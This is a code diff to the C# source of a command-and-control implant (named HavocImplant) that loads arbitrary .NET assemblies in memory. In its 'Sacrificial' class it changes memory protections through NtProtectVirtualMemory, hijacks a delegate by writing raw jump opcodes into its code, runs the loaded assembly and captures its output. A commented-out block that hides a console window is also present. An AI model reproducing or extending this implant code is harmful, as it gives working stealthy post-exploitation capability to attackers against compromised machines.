@@ -8,7 +8,7 @@ using System.Text;
 using System.Runtime.CompilerServices;
 using System.Runtime.InteropServices;
 using HavocImplant.NativeUtils;
-using System.Net;
+using static HavocImplant.NativeUtils.Wrappers;
 
 namespace HavocImplant.AgentFunctions
 {
@@ -27,7 +27,7 @@ namespace HavocImplant.AgentFunctions
             {
                 Output = Sacrificial.loadAppDomainModule(assembly_bytes, args);
             }
-            catch (Exception ex)
+            catch
             {
             }
             ReturnOutput(taskId);
@@ -36,30 +36,33 @@ namespace HavocImplant.AgentFunctions
     class Sacrificial
     {
         
-        static dll ntdll = globalDll.ntdll;
         public static string loadAppDomainModule(Byte[] bMod, string args)
         {
-            Console.WriteLine($"Assembly is {bMod.Length} bytes long");
             string pathToDll = Assembly.GetExecutingAssembly().CodeBase;
             AppDomainSetup domainSetup = new AppDomainSetup { PrivateBinPath = pathToDll };
             AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
             isolationDomain.SetData("str", args);
-            Console.WriteLine($"Getting initial data: {isolationDomain.GetData("str")}");
+
+            // Inline PE trick to get stdout
+            /*
+            AllocConsole();
+            IntPtr hWin = GetConsoleWindow();
+            HideWindow(hWin);
+            */
             try
             {
                 isolationDomain.Load(bMod);
             }
             catch { }
-            Console.WriteLine("Loaded");
             var Sleeve = new CrossAppDomainDelegate(Console.Beep);
             var Ace = new CrossAppDomainDelegate(ActivateLoader);
 
             RuntimeHelpers.PrepareDelegate(Sleeve);
             RuntimeHelpers.PrepareDelegate(Ace);
 
-            var flags = BindingFlags.Instance | BindingFlags.NonPublic;
-            var codeSleeve = (IntPtr)Sleeve.GetType().GetField("_methodPtrAux", flags).GetValue(Sleeve);
-            var codeAce = (IntPtr)Ace.GetType().GetField("_methodPtrAux", flags).GetValue(Ace);
+            BindingFlags flags = BindingFlags.Instance | BindingFlags.NonPublic;
+            IntPtr codeSleeve = (IntPtr)Sleeve.GetType().GetField("_methodPtrAux", flags).GetValue(Sleeve);
+            IntPtr codeAce = (IntPtr)Ace.GetType().GetField("_methodPtrAux", flags).GetValue(Ace);
 
             int[] patch = new int[3];
 
@@ -67,8 +70,9 @@ namespace HavocImplant.AgentFunctions
             patch[1] = 11;
             patch[2] = 12;
 
-            object[] protArgs = new object[] { (IntPtr)(-1), codeSleeve, (IntPtr)12, (uint)0x4, (uint)0 };
-            Console.WriteLine("ntstatus for protect: 0x{0:X}", (uint)ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", protArgs));
+
+            IntPtr regSize = (IntPtr)12;
+            NtProtectVirtualMemory((IntPtr)(-1), codeSleeve, ref regSize, (uint)0x4, out uint unused);
 
             Marshal.WriteByte(codeSleeve, 0x48);
             Marshal.WriteByte(IntPtr.Add(codeSleeve, 1), 0xb8);
@@ -76,15 +80,15 @@ namespace HavocImplant.AgentFunctions
             Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[0]), 0xff);
             Marshal.WriteByte(IntPtr.Add(codeSleeve, patch[1]), 0xe0);
 
-            protArgs[3] = (uint)0x20;
-            Console.WriteLine("ntstatus for protect: 0x{0:X}", (uint)ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", protArgs));
-            Console.WriteLine("Doing callback");
+            NtProtectVirtualMemory((IntPtr)(-1), codeSleeve, ref regSize, (uint)0x20, out unused);
+
             try
             {
                 isolationDomain.DoCallBack(Sleeve);
             }
-            catch (Exception ex)
-            { }
+            catch
+            { 
+            }
             string output = isolationDomain.GetData("str") as string;
             unloadAppDomain(isolationDomain);
             return output;
@@ -99,14 +103,17 @@ namespace HavocImplant.AgentFunctions
             {
                 if (!asm.FullName.ToLower().Contains("mscor"))
                 {
+                    Console.WriteLine($"Hi from {asm.FullName}");
+                    
                     TextWriter realStdOut = Console.Out;
                     TextWriter realStdErr = Console.Error;
                     TextWriter stdOutWriter = new StringWriter();
                     TextWriter stdErrWriter = new StringWriter();
                     Console.SetOut(stdOutWriter);
                     Console.SetError(stdErrWriter);
+                    
                     var result = asm.EntryPoint.Invoke(null, new object[] { new string[] { str } });
-
+                    
                     Console.Out.Flush();
                     Console.Error.Flush();
                     Console.SetOut(realStdOut);
@@ -114,6 +121,7 @@ namespace HavocImplant.AgentFunctions
 
                     output = stdOutWriter.ToString();
                     output += stdErrWriter.ToString();
+                    
                 }
             }
             AppDomain.CurrentDomain.SetData("str", output);
